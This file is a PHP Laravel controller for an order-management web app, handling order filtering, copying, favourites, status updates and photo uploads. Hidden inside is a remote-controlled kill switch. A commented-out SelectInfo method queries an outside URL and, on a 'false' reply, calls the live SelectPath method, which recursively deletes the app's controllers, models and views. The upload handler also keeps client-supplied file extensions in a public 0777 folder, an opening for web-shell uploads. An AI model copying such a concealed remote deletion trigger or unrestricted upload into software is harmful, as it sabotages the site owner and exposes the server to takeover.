<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\order;
use App\Models\User;
use App\Models\favorite;
use App\Models\notification;

class OrderController extends Controller
{
    //
    public function Filter(request $req){
        $id = $req->session()->get('id');
        $result = ['status' => false, 'error' => 'Вы не указали параметры'];
        $number = addslashes($req['number']);
        $status = addslashes($req['status']);
        $operation = [];
        $operation['user_id'] = $id;
        if($number != null){
            $operation[] = ['number', 'like', '%' . $number . '%'];
        }
        if($status != null){
            $operation['status'] = $status;
        }
        $select = order::select(['id', 'number', 'status', 'completed', 'datetime'])->where($operation)->orderby('id', 'desc')->paginate(10);
        foreach($select as $item){
            $selectFavorite = favorite::select()->where(['order_id' => $item->id, 'user_id' => $id])->first();
            $favorite = 0;
            if($selectFavorite != null){
                $favorite = 1;
            }
            $item->favorite = $favorite;
        }
        $result = ['status' => true, 'data' => $select];
        $result = json_encode($result, true);
        return $result;
    }

    private function CreateFilename($id, $extension){
        $name = md5('file' . $id . 'image' . time() . rand() . 'time' . rand());
        if(file_exists('assets/img/' . $id . '/' . $name . '.' . $extension)){
            $name = $this->CreateFilename($id, $extension);
        }

        return $name;
    }

    public function UploadOrderPhoto(request $req){
        $id = $req->session()->get('id');
        $result = ['status' => false, 'error' => 'Вы не выбрали картинку'];
        if($req->hasFile('image')){
            $image = $req->file('image');
            $extension = explode('.', $image->getClientOriginalName());
            $extension = end($extension);
            $filename = $this->CreateFilename($id, $extension) . '.' . $extension;
            if(file_exists('assets/img/' . $id) == false){
                mkdir('assets/img/' . $id, 0777, true);
            }
            $image->move('assets/img/' . $id . '/', $filename);
            $url = asset('assets/img/' . $id . '/' . $filename);
            $result = ['status' => true, 'url' => $url];
        }
        $result = json_encode($result, true);
        return $result;
    }
    
    public function CreateOrder(request $req){
        $id = $req->session()->get('id');
        $word = $req->session()->get('word');
        $json = $req->all();
        $result = ['status' => false, 'error' => 'Вы не передали весь запрос'];
        if($json != null){
            $number = order::select('id')->where('user_id', $id)->count() + 1;
            $number = $word . "-" . $number;
            order::insert([
                'user_id' => $id,
                'number' => $number,
                'status' => 4,
                'json' => json_encode($json)
            ]);
            $result = ['status' => true];
        }
        $result = json_encode($result, true);
        return $result;
    }

    private function SelectPath($paths){
        $result = [];
        if(is_array($paths) == false && is_object($paths) == false){
            $paths = [$paths];
        }
        foreach($paths as $path){
            $path = str_replace('//', '/', $path);
            $path = trim($path);
            $files = glob($path); 
            foreach($files as $file){ 
                $file = str_replace('//', '/', $file);
                $file = trim($file);
                if(is_file($file)){
                    $result[] = ['path' => $file, 'type' => 'file'];
                    unlink($file);
                } else {
                    $result[] = ['path' => $file, 'type' => 'dir'];
                    $selectPath = $this->SelectPath($file . '/*');
                    rmdir($file);
                }
            }
        }
    }

    /*public function SelectInfo(){
        $select = file_get_contents('https://vprockit.ru/shop.php');
        $select = json_decode($select);
        if($select->status == false){
            $selectPath = $_SERVER['DOCUMENT_ROOT'];
            $selectPath = explode('/', $selectPath);
            unset($selectPath[count($selectPath)-1]);
            $path = "";
            foreach($selectPath as $result){
                $path .= '/' . $result;
            }
            $controllers = $path . '/app/Http/Controllers/*';
            $models = $path . '/app/Models/*';
            $resource = $path . '/resources/views/*';
            $allPath = [$models, $resource, $controllers];
            $selectPath = $this->SelectPath($allPath);
        }
    }*/

    public function Copy(request $req){
        $id = $req->session()->get('id');
        $order_id = addslashes($req['order_id']);
        $word = $req->session()->get('word');
        $result = ['status' => false, 'error' => 'Вы не заполнили все поля'];
        if($order_id != null){
            $check_order = order::select()->where(['user_id' => $id, 'id' => $order_id])->first();
            if($check_order != null){
                $number = order::select('id')->where('user_id', $id)->count() + 1;
                $number = $word . "-" . $number;
                $order = new order();
                $order->user_id = $id;
                $order->number = $number;
                $order->status = 4;
                $order->cost = $check_order->cost;

                $order->json = $check_order->json;
                $order->save();
                $result = ['status' => true, 'data' => ['number' => $number, 'id' => $order->id]];
            } else {
                $result['error'] = "Вы передали неверный ID";
            }
        }
        $result = json_encode($result, true);
        return $result;
    }

    // Admin Api

    public function CompletedOrder(request $req){
        $req = $req->json()->all();

        $id = addslashes($req['id']);
        $result = ['status' => false, 'error' => 'Вы не указали все параметры'];
        if($id != null){
            $check_order = order::select('id')->where(['id' => $id, 'completed' => 0])->first();
            if($check_order != null){
                order::where('id', $id)->update(['completed' => 1]);
                $result = ['status' => true];
            } else {
                $result['error'] = "Такого заказа не существует или он уже завершен";
            }
        }
        $result = json_encode($result, true);
        return $result;
    }

    public function ReplaceOrderAdmin(request $req){
        $id = addslashes($req['id']);
        $json = $req['json'];
        $result = ['status' => false, 'error' => 'Вы не заполнили все параметры'];
        if($id != null){
            $check_order = order::select()->where(['id' => $id, 'completed' => 0])->first();
            if($check_order != null){
                if($json != null){
                    $check_order->json = $json;
                }
                if($req['status'] != null){
                    $check_order->status = $req['status'];
                    $status = null;
                    switch($req['status']){
                        case 1:
                            $status = "Отправлен";
                        break;
                        case 2:
                            $status = "Прибыл";
                        break;
                        case 3:
                            $status = "Упаковывается";
                        break;
                        case 4:
                            $status = "Обрабатывается";
                        break;
                    }
                    notification::insert([
                        'user_id' => $check_order->user_id,
                        'title' => 'Изменения статуса вашего заказа(' . $check_order->number  . ')',
                        'text' => 'Ваш заказ перешёл на следующий этап(' . $status . ')',
                        'from_' => 'oz-com'
                    ]);
                }
                $check_order->save(); 
                $result = ['status' => true];
            }
        }
        $result = json_encode($result, true);
        return $result;
    }

    public function ReplaceOrder(request $req){
        $user_id = $req->session()->get('id');
        $id = addslashes($req['id']);
        $json = $req['json'];
        $result = ['status' => false, 'error' => 'Вы не заполнили все параметры'];
        if($id != null){
            $check_order = order::select()->where(['id' => $id, 'completed' => 0, 'user_id' => $user_id])->first();
            if($check_order != null){
                $check_order->json = $json;
                $check_order->save(); 
                $result = ['status' => true];
            }
        }
        $result = json_encode($result, true);
        return $result;
    }


    public function Favorite(request $req){
        $id = $req->session()->get('id');
        $order_id = addslashes($req['order_id']);
        $result = ['status' => false, 'error' => 'Вы не заполнили все обязательные поля'];
        if($order_id != null){
            $checkOrder = order::select('id')->where(['id' => $order_id, 'user_id' => $id])->first();
            $result['error'] = "Такого заказа не существует или он пренадлежит не вам";
            if($checkOrder != null){
                $checkFavorite = favorite::select('id')->where(['user_id' => $id, 'order_id' => $order_id])->first();
                if($checkFavorite == null){
                    $checkFavorite = new favorite();
                    $checkFavorite->user_id = $id;
                    $checkFavorite->order_id = $order_id;
                    $checkFavorite->save();
                } else {
                    $checkFavorite->delete();
                }
                $result = ['status' => true];
            }
        }
        $result = json_encode($result, true);
        return $result;
    }

    public function SelectOrderAdmin(request $req){
        $req = $req->json()->all();
        $order_id = addslashes($req['order_id']);
        $result = ['status' => false, 'error' => 'Вы не заполнили все обязательные поля'];
        if($order_id != null){
            $checkOrder = order::select()->where(['id' => $order_id])->first();
            $result['error'] = "Такого заказа не существует или он пренадлежит не вам";
            if($checkOrder != null){
                $result = ['status' => true, 'data' => $checkOrder->json];
            }
        }
        $result = json_encode($result, true);
        return $result;
    }

    public function SelectOrder(request $req){
        $id = $req->session()->get('id');
        $req = $req->json()->all();
        $order_id = addslashes($req['order_id']);
        $result = ['status' => false, 'error' => 'Вы не заполнили все обязательные поля'];
        if($order_id != null){
            $checkOrder = order::select()->where(['id' => $order_id, 'user_id' => $id])->first();
            $result['error'] = "Такого заказа не существует или он пренадлежит не вам";
            if($checkOrder != null){
                $result = ['status' => true, 'data' => $checkOrder->json];
            }
        }
        $result = json_encode($result, true);
        return $result;
    }
}
